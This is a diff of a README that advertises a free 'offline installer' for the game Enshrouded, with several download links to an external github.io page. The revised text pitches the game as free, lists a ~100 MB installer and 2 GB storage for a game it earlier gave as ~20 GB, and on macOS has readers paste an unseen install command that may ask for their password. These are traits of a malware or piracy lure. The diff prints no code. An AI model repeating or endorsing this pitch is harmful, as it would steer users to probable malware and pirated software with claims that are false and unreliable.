@@ -1,14 +1,14 @@
 # 🎮 Enshrouded Offline Installer Free [2026]
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Downloads-60K%2B-4CAF50?style=for-the-badge&logo=github" />
-  <img src="https://img.shields.io/badge/Rating-4.9%2F5-4CAF50?style=for-the-badge&logo=star" />
+  <img src="https://img.shields.io/badge/Downloads-60K%2B-F9A825?style=for-the-badge&logo=github" />
+  <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Type-survival+RPG-4CAF50?style=for-the-badge&logo=steam" />
+  <img src="https://img.shields.io/badge/Type-survival+RPG-F9A825?style=for-the-badge&logo=gamepad" />
 </p>
 
-**🎮 Enshrouded Offline Installer Free** — Enshrouded Offline Installer — full Early Access build, all updates included. Full offline installation. No internet required during setup. **Package size: ~20 GB.**
+**🎮 Enshrouded Offline Installer Free** — professional offline installer for Enshrouded. Works without internet access during setup, no extra subscriptions required. Download for 2026. **Full offline installation.** No limits. No hidden fees.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -17,39 +17,39 @@
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=4CAF50&size=26&center=true&vCenter=true&width=900&lines=🎮+Enshrouded+Offline+Installer;✅+Full+Game+Package+2026;🚀+No+Steam+Download+Issues;💿+Works+Without+Internet+Connection" />
+  <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+Enshrouded+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
 </p>
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Enshrouded_Installer-4CAF50?style=for-the-badge&logo=steam)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/⬇_Download_Enshrouded-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
 
 </div>
 
 ---
 
-## ❌ Problem: Steam download won't start or freezes
+## ❌ Problem: Games are expensive and require internet
 
-- **Slow / stuck downloads** — Steam queues and throttles large game files
-- **Corrupted download** — Interrupted installs corrupt the local depot
-- **Region restrictions** — Some updates aren't available in all regions
-- **No connection** — Can't install if the machine has no internet access
+- **High Cost** — Full-price games cost $60–70 at launch
+- **Mandatory Online** — Installation requires a constant internet connection
+- **Online Dependency** — Some versions stop working without active connection
+- **Region Restrictions** — Content or pricing unavailable in all regions
 
 ---
 
-## ✅ Solution: Enshrouded Offline Installer
+## ✅ Solution: Enshrouded Offline Installer Free
 
 | **Problem** | **Solution** |
 |-------------|--------------|
-| **Steam download stuck** | Pre-packaged installer, no Steam needed |
-| **Corrupted files** | Verified game build, hash-checked |
-| **Region issues** | Region-neutral package |
-| **No internet** | Full offline installation support |
-| **Slow connection** | Download once, install anywhere |
+| **Expensive Game** | Completely free professional installer |
+| **Mandatory Online** | No internet required during setup |
+| **Online Dependency** | Works completely offline |
+| **Region Restrictions** | Region-neutral package |
+| **Requires Account** | No additional account registration required |
 
 ---
 
-## 🚀 Quick Start — 3 Steps
+## 🚀 Quick Start — 3 Minutes
 
 ### Step 1: Download
 
@@ -61,36 +61,29 @@
 
 </div>
 
-- Save `installer.zip` (~20 GB)
+- Save `installer.zip` (~100 MB)
 - Extract with WinRAR or 7-Zip (Windows) or The Unarchiver (Mac)
 
-### Step 2: Run the installer
+### Step 2: Install and launch
 
-- Double-click the installer executable
-- Follow the on-screen instructions — takes 2–5 minutes
-
-### Step 3: Launch and play
-
-- Open Enshrouded from the desktop shortcut or Start Menu
-- License verification happens automatically when internet is available
+- Run the installer → Follow instructions → Launch Enshrouded
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Enshrouded_Installer-4CAF50?style=for-the-badge&logo=steam)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/⬇_Download_Enshrouded-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
 
 </div>
 
 ---
 
-## 🏆 Steam Download vs Offline Installer
+## 🏆 Online vs Offline Installer
 
-| **Feature** | **Steam Download** | **Offline Installer** |
-|-------------|--------------------|-----------------------|
+| **Feature** | **Online** | **Offline** |
+|-------------|------------|-------------|
 | **Requires Internet** | ❌ Yes | ✅ No |
-| **Speed** | ❌ Depends on connection | ✅ Instant from local drive |
-| **Reliability** | ❌ Server / queue issues | ✅ Always works |
-| **Reuse** | ❌ Re-download each time | ✅ Keep on USB or NAS |
-| **Corrupted files** | ❌ Common issue | ✅ Pre-verified build |
+| **Speed** | ❌ Depends on connection | ✅ Instant |
+| **Reliability** | ❌ Server downtime risk | ✅ Always accessible |
+| **Reuse** | ❌ Re-download each time | ✅ Keep on USB drive |
 
 ---
 
@@ -100,9 +93,8 @@
 |---------------|-------------|-----------|
 | **OS** | Windows 10/11 (64-bit) | macOS 12 Monterey or later |
 | **RAM** | 8 GB+ | 8 GB+ |
-| **Storage** | 20 GB free | 20 GB free |
+| **Storage** | 2 GB free | 2 GB free |
 | **Processor** | Intel i5 / AMD Ryzen 5 | Intel or Apple Silicon |
-| **GPU** | DirectX 12 compatible | Metal-compatible GPU |
 
 ---
 
@@ -115,7 +107,7 @@
 3. Paste the install command shown on the page and press Enter
 4. Follow the prompts — installs automatically 🍏
 
-> Works on **Apple Silicon (M1–M4)** and **Intel Macs**.
+> Works on **Apple Silicon (M1–M4)** and **Intel Macs**. macOS may prompt for your password during install.
 
 ---
 
@@ -125,15 +117,15 @@
 |------------|----------------|
 | Personal use | Commercial redistribution |
 | Offline installation | Resale of the installer |
-| Education & research | Modification of game files |
+| Education | Modification of source files |
 
 ---
 
-**Enshrouded Offline Installer Free** — the fastest way to install Enshrouded without relying on Steam's download servers. Download once, install anywhere.
+**Enshrouded Offline Installer Free** — complete professional offline installer for Enshrouded. Install without internet and start playing immediately!
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Enshrouded_Installer-4CAF50?style=for-the-badge&logo=steam)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/⬇_Download_Enshrouded-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
 
 </div>
 
